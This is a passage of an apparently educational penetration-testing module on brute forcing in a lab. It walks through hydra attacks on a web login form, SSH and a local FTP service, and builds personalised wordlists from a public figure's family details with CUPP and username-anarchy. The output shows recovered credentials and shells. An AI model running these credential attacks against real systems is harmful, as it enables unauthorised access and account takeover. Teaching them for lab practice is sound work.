+<p>So, we may be able to use <code>Admin Panel</code> as our fail string. However, this may lead to false-positives because if the <code>Admin Panel</code> also exists in the page after logging in, it will not work, as <code>hydra</code> will not know that it was a successful login attempt.</p>
+<p>A better strategy is to pick something from the HTML source of the login page.\
+What we have to pick should be very <em>unlikely</em> to be present after logging in, like the <strong>login button</strong> or the <em>password field</em>. Let's pick the login button, as it is fairly safe to assume that there will be no login button after logging in, while it is possible to find something like <code>please change your password</code> after logging in.</p>
+<p>We can click <code>[Ctrl + U]</code> in Firefox to show the HTML page source, and search for <code>login</code>:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">  &lt;form name=<span class="hljs-string">'login'</span> autocomplete=<span class="hljs-string">'off'</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">'form'</span> action=<span class="hljs-string">''</span> <span class="hljs-function"><span class="hljs-keyword">method</span>='<span class="hljs-title">post</span>'&gt;</span>
+</code></pre>
+<p>We see it in a couple of places as title/header, and we find our button in the HTML form shown above. We do not have to provide the entire string, so we will use <code>&lt;form name='login'</code>, which should be distinct enough and will probably not exist after a successful login.</p>
+<p>So, our syntax for the <code>http-post-form</code> should be as follows:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash"><span class="xml">"/login.php:[user parameter]=</span><span class="hljs-keyword">^USER</span><span class="xml">^&amp;[password parameter]=</span><span class="hljs-keyword">^PASS</span><span class="xml"></span><span class="hljs-keyword">^:F</span><span class="xml">=<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'login'</span>"</span></span>
+</code></pre>
+<h2 id="determine-login-parameters">Determine Login Parameters</h2>
+<hr>
+<p>We can easily find POST parameters if we intercept the login request with Burp Suite or take a closer look at the admin panel's source code.</p>
+<hr>
+<h3 id="using-browser">Using Browser</h3>
+<p>One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools with <code>[CTRL + SHIFT + E]</code>.</p>
+<p>Once we do, we can simply try to login with any credentials (<code>test</code>:<code>test</code>) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can simply right-click on one of them, and select <code>Copy</code> &gt; <code>Copy POST data</code>:</p>
+<p><img src="storage\modules\57\bruteforcing\_firefox\_network\_1.jpg" alt="FoxyProxy"></p>
+<p>This would give us the following POST parameters:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash">username=<span class="hljs-built_in">test</span>&amp;password=<span class="hljs-built_in">test</span>
+</code></pre>
+<p>Another option would be to used <code>Copy</code> &gt; <code>Copy as cURL</code>, which would copy the entire <code>cURL</code> command, which we can use in the Terminal to repeat the same HTTP request:</p>
+<p>Determine Login Parameters</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl 'http:/</span><span class="hljs-regexp">/178.128.40.63:31554/</span>login.php<span class="hljs-string">' -H '</span>User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; rv:68.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox<span class="hljs-regexp">/68.0' -H 'Accept: text/</span>html,application<span class="hljs-regexp">/xhtml+xml,application/</span>xml;q=<span class="hljs-number">0.9</span>,image<span class="hljs-regexp">/webp,*/</span>*;q=<span class="hljs-number">0.8</span><span class="hljs-string">' -H '</span>Accept-<span class="hljs-string">Language:</span> en-US,en;q=<span class="hljs-number">0.5</span><span class="hljs-string">' --compressed -H '</span>Content-<span class="hljs-string">Type:</span> application<span class="hljs-regexp">/x-www-form-urlencoded' -H 'Origin: http:/</span><span class="hljs-regexp">/178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http:/</span><span class="hljs-regexp">/178.128.40.63:31554/</span>login.php<span class="hljs-string">' -H '</span><span class="hljs-string">Cookie:</span> PHPSESSID=<span class="hljs-number">8</span>iafr4t6c3s2nhkaj63df43v05<span class="hljs-string">' -H '</span>Upgrade-Insecure-<span class="hljs-string">Requests:</span> <span class="hljs-number">1</span><span class="hljs-string">' -H '</span>Sec-<span class="hljs-string">GPC:</span> <span class="hljs-number">1</span><span class="hljs-string">' --data-raw '</span>username=test&amp;password=test<span class="hljs-string">'</span>
+</code></pre>
+<p>As we can see, this command also contains the parameters <code>--data-raw 'username=test&amp;password=test'</code>.</p>
+<hr>
+<h3 id="using-burp-suite">Using Burp Suite</h3>
+<p>In case we were dealing with a web page that sends many HTTP requests, it may be easier to use Burp Suite in order to go through all sent HTTP requests, and pick the ones we are interested in. To do that, we will first start BurpSuite from Application Dock at the bottom in Pwnbox, skip all the messages until the application starts, and then Click on the <code>Proxy</code> tab:</p>
+<p><img src="storage\modules\57\web\_fnb\_burp.jpg" alt="FoxyProxy"></p>
+<p>Next, We will go to Firefox and enable the <code>Burp Proxy</code> by clicking on the <code>FoxyProxy</code> button in Firefox, and then choosing <code>Burp</code>, as seen in the screenshot below:</p>
+<p><img src="storage\modules\57\bruteforcing\_foxyproxy\_1.jpg" alt="FoxyProxy"></p>
+<p>Now, all we will do is attempt a login with any username/password 'e.g. <code>admin:admin</code>', and go back to BurpSuite, to find the login request captured: <img src="storage\modules\57\bruteforcing\_burp\_request\_1.jpg" alt="FoxyProxy"></p>
+<p>Tip: If we find another request captured, we can click "Forward" until we reach our request from "/login.php".</p>
+<p>What we need from the above-captured string is the very last line:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash"><span class="hljs-attr">username</span>=admin&amp;password=admin
+</code></pre>
+<p>To use in a <code>hydra http-post-form</code>, we can take it as is, and replace the username/password we used <code>admin:admin</code> with <code>^USER^</code> and <code>^PASS^</code>. The specification of our final target path should be as follows:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash"><span class="xml">"/login.php:username=</span><span class="hljs-keyword">^USER</span><span class="xml">^&amp;password=</span><span class="hljs-keyword">^PASS</span><span class="xml"></span><span class="hljs-keyword">^:F</span><span class="xml">=<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'login'</span>"</span></span>
+</code></pre>
+<h2 id="login-form-attacks">Login Form Attacks</h2>
+<hr>
+<p>In our situation, we don't have any information about the existing usernames or passwords. Since we enumerated all available ports to us and we couldn't determine any useful information, we have the option to test the web application form for default credentials in combination with the <code>http-post-form</code> module.</p>
+<hr>
+<h3 id="default-credentials">Default Credentials</h3>
+<p>Let's try to use the <code>ftp-betterdefaultpasslist.txt</code> list with the default credentials to test if one of the accounts is registered in the web application.</p>
+<p>Login Form Attacks</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ hydra -C /opt</span><span class="hljs-regexp">/useful/</span>SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <span class="hljs-number">178.35</span>.<span class="hljs-number">49.134</span> -s <span class="hljs-number">32901</span> http-post-form <span class="hljs-string">"/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'"</span>
+
+Hydra v9.<span class="hljs-number">1</span> (c) d02<span class="hljs-number">0</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).
+
+Hydra (<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/vanhauser</span>-thc/thc-hydra)
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">66</span> login tries, ~<span class="hljs-number">5</span> tries per task
+[DATA] attacking http-post-<span class="hljs-symbol">form:</span>/<span class="hljs-regexp">/178.35.49.134:32901/login</span>.<span class="hljs-symbol">php:</span>username=^USER^&amp;password=^PASS^<span class="hljs-symbol">:F=&lt;form</span> name=<span class="hljs-string">'login'</span>
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target completed, <span class="hljs-number">0</span> valid password found
+Hydra (<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/vanhauser</span>-thc/thc-hydra)
+</code></pre>
+<p>As we can see, we were not able to identify any working credentials. Still, this only took a few seconds, and we ruled out the use of default passwords. Now, we can move on to use a password wordlist.</p>
+<hr>
+<h3 id="password-wordlist">Password Wordlist</h3>
+<p>Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as <code>admin</code>, <code>administrator</code>, <code>wpadmin</code>, <code>root</code>, <code>adm</code>, and similar are used in administration panels and are rarely changed. Knowing this fact allows us to limit the number of possible usernames. The most common username administrators use is <code>admin</code>. In this case, we specify this username for our next attempt to get access to the admin panel.</p>
+<p>Login Form Attacks</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ hydra -l admin -P /opt</span><span class="hljs-regexp">/useful/</span>SecLists/Passwords/Leaked-Databases/rockyou.txt -f <span class="hljs-number">178.35</span>.<span class="hljs-number">49.134</span> -s <span class="hljs-number">32901</span> http-post-form <span class="hljs-string">"/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'"</span>
+
+Hydra v9.<span class="hljs-number">1</span> (c) <span class="hljs-number">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).
+
+Hydra (<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/vanhauser</span>-thc/thc-hydra)
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">14344398</span> login tries (<span class="hljs-symbol">l:</span><span class="hljs-number">1</span>/<span class="hljs-symbol">p:</span><span class="hljs-number">14344398</span>), ~<span class="hljs-number">896525</span> tries per task
+[DATA] attacking http-post-<span class="hljs-symbol">form:</span>/<span class="hljs-regexp">/178.35.49.134:32901/login</span>.<span class="hljs-symbol">php:</span>username=^USER^&amp;password=^PASS^<span class="hljs-symbol">:F=&lt;form</span> name=<span class="hljs-string">'login'</span>
+
+[PORT][http-post-form] <span class="hljs-symbol">host:</span> <span class="hljs-number">178.35</span>.<span class="hljs-number">49.134</span>   <span class="hljs-symbol">login:</span> admin   <span class="hljs-symbol">password:</span> password123
+[STATUS] attack finished <span class="hljs-keyword">for</span> <span class="hljs-number">178.35</span>.<span class="hljs-number">49.134</span> (valid pair found)
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
+Hydra (<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/vanhauser</span>-thc/thc-hydra)
+</code></pre>
+<p>We can try to log in with these credentials now:</p>
+<h2 id="personalized-wordlists">Personalized Wordlists</h2>
+<hr>
+<p>To create a personalized wordlist for the user, we will need to collect some information about them. As our example here is a known public figure, we can check out their <a href="https://en.wikipedia.org/wiki/Bill\_Gates">Wikipedia page</a> or do a basic Google search to gather the necessary information. Even if this was not a known figure, we can still carry out the same attack and create a personalized wordlist for them. All we need to do is gather some information about them, which is discussed in detail in the <a href="https://academy.hackthebox.com/module/details/20">Hashcat</a> module, so feel free to check it out.</p>
+<hr>
+<h3 id="cupp">CUPP</h3>
+<p>Many tools can create a custom password wordlist based on certain information. The tool we will be using is <code>cupp</code>, which is pre-installed in your PwnBox. If we are doing the exercise from our own VM, we can install it with <code>sudo apt install cupp</code> or clone it from the <a href="https://github.com/Mebus/cupp">Github repository</a>. <code>Cupp</code> is very easy to use. We run it in interactive mode by specifying the <code>-i</code> argument, and answer the questions, as follows:</p>
+<p>Personalized Wordlists</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ cupp -i
+
+___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||<span class="hljs-comment">--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]</span>
+                            [ Mebus | https://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] <span class="hljs-keyword">If</span> you don<span class="hljs-symbol">'t</span> know <span class="hljs-keyword">all</span> the info, just hit enter <span class="hljs-keyword">when</span> asked! ;)
+
+&gt; First Name: William
+&gt; Surname: Gates
+&gt; Nickname: Bill
+&gt; Birthdate (DDMMYYYY): <span class="hljs-number">28101955</span>
+
+&gt; Partners) name: Melinda
+&gt; Partners) nickname: Ann
+&gt; Partners) birthdate (DDMMYYYY): <span class="hljs-number">15081964</span>
+
+&gt; Child<span class="hljs-symbol">'s</span> name: Jennifer
+&gt; Child<span class="hljs-symbol">'s</span> nickname: Jenn
+&gt; Child<span class="hljs-symbol">'s</span> birthdate (DDMMYYYY): <span class="hljs-number">26041996</span>
+
+&gt; Pet<span class="hljs-symbol">'s</span> name: Nila
+&gt; Company name: Microsoft
+
+&gt; <span class="hljs-keyword">Do</span> you want to add <span class="hljs-keyword">some</span> key words about the victim? Y/[N]: Phoebe,Rory
+&gt; <span class="hljs-keyword">Do</span> you want to add special chars <span class="hljs-keyword">at</span> the <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> words? Y/[N]: y
+&gt; <span class="hljs-keyword">Do</span> you want to add <span class="hljs-keyword">some</span> random numbers <span class="hljs-keyword">at</span> the <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> words? Y/[N]:y
+&gt; Leet mode? (i.e. leet = <span class="hljs-number">1337</span>) Y/[N]: y
+
+[+] Now making a dictionary...
+[+] Sorting list <span class="hljs-keyword">and</span> removing duplicates...
+[+] Saving dictionary to william.txt, counting <span class="hljs-number">43368</span> words.
+[+] Now load your pistolero <span class="hljs-keyword">with</span> william.txt <span class="hljs-keyword">and</span> shoot! Good luck!
+</code></pre>
+<p>And as a result, we get our personalized password wordlist saved as <code>william.txt</code>.</p>
+<hr>
+<h3 id="password-policy">Password Policy</h3>
+<p>The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions:</p>
+<ol>
+<li>8 characters or longer</li>
+<li>contains special characters</li>
+<li>contains numbers</li>
+</ol>
+<p>So, we can remove any passwords that do not meet these conditions from our wordlist. Some tools would convert password policies to <code>Hashcat</code> or <code>John</code> rules, but <code>hydra</code> does not support rules for filtering passwords. So, we will simply use the following commands to do that for us:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash">sed -<span class="hljs-keyword">ri</span> <span class="hljs-string">'/^.{,7}$/d'</span> william.txt            # <span class="hljs-built_in">remove</span> shorter than <span class="hljs-number">8</span>
+sed -<span class="hljs-keyword">ri</span> <span class="hljs-string">'/[!-/:-@\[-`\{-~]+/!d'</span> william.txt # <span class="hljs-built_in">remove</span> <span class="hljs-keyword">no</span> special chars
+sed -<span class="hljs-keyword">ri</span> <span class="hljs-string">'/[0-9]+/!d'</span> william.txt            # <span class="hljs-built_in">remove</span> <span class="hljs-keyword">no</span> numbers
+</code></pre>
+<p>We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.</p>
+<hr>
+<h3 id="mangling">Mangling</h3>
+<p>It is still possible to create many permutations of each word in that list. We never know how our target thinks when creating their password, and so our safest option is to add as many alterations and permutations as possible, noting that this will, of course, take much more time to brute force.</p>
+<p>Many great tools do word mangling and case permutation quickly and easily, like <a href="https://github.com/digininja/RSMangler">rsmangler</a> or <a href="https://github.com/sc0tfree/mentalist.git">The Mentalist</a>. These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind because we might need them in other modules and situations.</p>
+<p>As a starting point, we will stick to the wordlist we have generated so far and not perform any mangling on it. In case our wordlist does not hit a successful login, we will go back to these tools and perform some mangling to increase our chances of guessing the password.</p>
+<p>Tip: The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered.</p>
+<hr>
+<h3 id="custom-username-wordlist">Custom Username Wordlist</h3>
+<p>We should also consider creating a personalized username wordlist based on the person's available details. For example, the person's username could be <code>b.gates</code> or <code>gates</code> or <code>bill</code>, and many other potential variations. There are several methods to create the list of potential usernames, the most basic of which is simply writing it manually.</p>
+<p>One such tool we can use is <a href="https://github.com/urbanadventurer/username-anarchy">Username Anarchy</a>, which we can clone from GitHub, as follows:</p>
+<p>Personalized Wordlists</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ git clone https:/</span><span class="hljs-regexp">/github.com/</span>urbanadventurer/username-anarchy.git
+
+Cloning into <span class="hljs-string">'username-anarchy'</span>...
+<span class="hljs-string">remote:</span> Enumerating <span class="hljs-string">objects:</span> <span class="hljs-number">386</span>, done.
+<span class="hljs-string">remote:</span> Total <span class="hljs-number">386</span> (delta <span class="hljs-number">0</span>), reused <span class="hljs-number">0</span> (delta <span class="hljs-number">0</span>), pack-reused <span class="hljs-number">386</span>
+Receiving <span class="hljs-string">objects:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">386</span><span class="hljs-regexp">/386), 16.76 MiB | 5.38 MiB/</span>s, done.
+Resolving <span class="hljs-string">deltas:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">127</span>/<span class="hljs-number">127</span>), done.
+</code></pre>
+<p>This tool has many use cases that we can take advantage of to create advanced lists of potential usernames. However, for our simple use case, we can simply run it and provide the first/last names as arguments, and forward the output into a file, as follows:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash">./username-anarchy <span class="hljs-keyword">Bill </span>Gates &gt; <span class="hljs-keyword">bill.txt</span>
+</code></pre>
+<p>We should finally have our username and passwords wordlists ready and we could attack the SSH server.</p>
+<h2 id="service-authentication-brute-forcing">Service Authentication Brute Forcing</h2>
+<hr>
+<h3 id="ssh-attack">SSH Attack</h3>
+<p>The command used to attack a login service is fairly straightforward. We simply have to provide the username/password wordlists, and add <code>service://SERVER_IP:PORT</code> at the end. As usual, we will add the <code>-u -f</code> flags. Finally, when we run the command for the first time, <code>hydra</code> will suggest that we add the <code>-t 4</code> flag for a max number of parallel attempts, as many <code>SSH</code> limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped. Our final command should be as follows:</p>
+<p>Service Authentication Brute Forcing</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">4</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">4</span> tasks, <span class="hljs-number">157116</span> login tries (l:<span class="hljs-number">12</span>/p:<span class="hljs-number">13093</span>), ~<span class="hljs-number">39279</span> tries per task
+[<span class="hljs-keyword">DATA</span>] attacking ssh://<span class="hljs-number">178.35</span><span class="hljs-number">.49</span><span class="hljs-number">.134</span>:<span class="hljs-number">22</span>/
+[<span class="hljs-keyword">STATUS</span>] <span class="hljs-number">77.00</span> tries/<span class="hljs-keyword">min</span>, <span class="hljs-number">77</span> tries <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">157039</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> <span class="hljs-number">33</span>:<span class="hljs-number">60</span>h, <span class="hljs-number">4</span> active
+[PORT][ssh] host: <span class="hljs-number">178.35</span><span class="hljs-number">.49</span><span class="hljs-number">.134</span>   login: b.gates   <span class="hljs-keyword">password</span>: ...SNIP...
+[<span class="hljs-keyword">STATUS</span>] attack finished <span class="hljs-keyword">for</span> <span class="hljs-number">178.35</span><span class="hljs-number">.49</span><span class="hljs-number">.134</span> (valid pair <span class="hljs-keyword">found</span>)
+<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid <span class="hljs-keyword">password</span> <span class="hljs-keyword">found</span>
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+</code></pre>
+<p>We see that it takes some time to finish, but eventually, we get a working pair, and we identify the user <code>b.gates</code>. Now, we can attempt ssh-ing in using the credentials we got:</p>
+<p>Service Authentication Brute Forcing</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> ssh b.gates<span class="hljs-meta">@178.35.49.134</span> -p 22
+
+b.gates<span class="hljs-meta">@SERVER_IP's</span> password: <span class="hljs-symbol">*</span><span class="hljs-symbol">*</span><span class="hljs-symbol">*</span><span class="hljs-symbol">*</span><span class="hljs-symbol">*</span><span class="hljs-symbol">*</span><span class="hljs-symbol">*</span><span class="hljs-symbol">*</span>
+
+b.gates<span class="hljs-meta">@bruteforcing:~$</span> whoami
+b.gates
+</code></pre>
+<p>As we can see, we can <code>SSH</code> in, and get a shell on the server.</p>
+<hr>
+<h3 id="ftp-brute-forcing">FTP Brute Forcing</h3>
+<p>Once we are in, we can check out what other users are on the system:</p>
+<p>Service Authentication Brute Forcing</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">b</span>.gates@bruteforcing:~$ ls /home
+
+<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.gates</span>  m.gates
+</code></pre>
+<p>We notice another user, <code>m.gates</code>. We also notice in our local <code>recon</code> that port <code>21</code> is open locally, indicating that an <code>FTP</code> must be available:</p>
+<p>Service Authentication Brute Forcing</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">b.gates@bruteforcing:</span>~$ netstat -antp | grep -i list
+
+(No info could be read for <span class="hljs-string">"-p"</span>: geteuid()=<span class="hljs-number">1000</span> but you should be root.)
+tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">21</span>            <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:*               LISTEN      - 
+tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">80</span>              <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:*               LISTEN      -
+tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">80</span>                   :::*                    LISTEN      -
+</code></pre>
+<p>Next, we can try brute forcing the <code>FTP</code> login for the <code>m.gates</code> user now.</p>
+<p>Note 1: Sometimes administrators test their security measures and policies with different tools. In this case, the administrator of this web server kept "hydra" installed. We can benefit from it and use it against the local system by attacking the FTP service locally or remotely.</p>
+<p>Note 2: "rockyou-10.txt" can be found in "/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt", which contains 92 passwords in total. This is a shorter version of "rockyou.txt" which includes 14,344,391 passwords.</p>
+<p>So, similarly to how we attacked the <code>SSH</code> service, we can perform a similar attack on <code>FTP</code>:</p>
+<p>Service Authentication Brute Forcing</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">b</span>.gates@bruteforcing:~$ hydra -l m<span class="hljs-selector-class">.gates</span> -P rockyou-<span class="hljs-number">10</span><span class="hljs-selector-class">.txt</span> ftp:<span class="hljs-comment">//127.0.0.1</span>
+
+Hydra v9.<span class="hljs-number">0</span> (c) <span class="hljs-number">2019</span> by van Hauser/THC - Please do not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes.
+
+Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra)</span>
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">92</span> login tries (l:<span class="hljs-number">1</span>/<span class="hljs-selector-tag">p</span>:<span class="hljs-number">92</span>), ~<span class="hljs-number">6</span> tries per task
+[DATA] attacking ftp:<span class="hljs-comment">//127.0.0.1:21/</span>
+
+[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>   login: m<span class="hljs-selector-class">.gates</span>   password: &lt;..<span class="hljs-selector-class">.SNIP</span>...&gt;
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
+Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra)</span>
+</code></pre>
+<p>We can now attempt to <code>FTP</code> as that user, or even switch to that user. Let us try both:</p>
+<pre><code class="lang-shell-session">b.gates@bruteforcing:~$ <span class="hljs-keyword">ftp</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
+
+Connected <span class="hljs-built_in">to</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>.
+<span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span>)
+Name (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:b.gates): m.gates
+
+<span class="hljs-number">331</span> Please specify <span class="hljs-keyword">the</span> password.
+Password: 
+
+<span class="hljs-number">230</span> Login successful.
+Remote <span class="hljs-keyword">system</span> type is UNIX.
+Using binary mode <span class="hljs-built_in">to</span> transfer <span class="hljs-built_in">files</span>.
+<span class="hljs-keyword">ftp</span>&gt; dir
+
+<span class="hljs-number">200</span> PORT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">PASV</span>.
+<span class="hljs-number">150</span> Here comes <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> listing.
+-rw<span class="hljs-comment">-------    1 1001     1001           33 Sep 11 00:06 flag.txt</span>
+<span class="hljs-number">226</span> Directory <span class="hljs-built_in">send</span> OK.
+</code></pre>
+<p>And to switch to that user:</p>
+<pre><code class="lang-shell-session">b.gates<span class="hljs-variable">@bruteforcing</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>su - m.gates
+
+<span class="hljs-symbol">Password:</span> *********
+m.gates<span class="hljs-variable">@bruteforcing</span><span class="hljs-symbol">:~</span>$
+</code></pre>
+<pre><code class="lang-shell-session">m.gates<span class="hljs-variable">@bruteforcing</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>whoami
+
+m.gates
+</code></pre>
+</div></body></html>
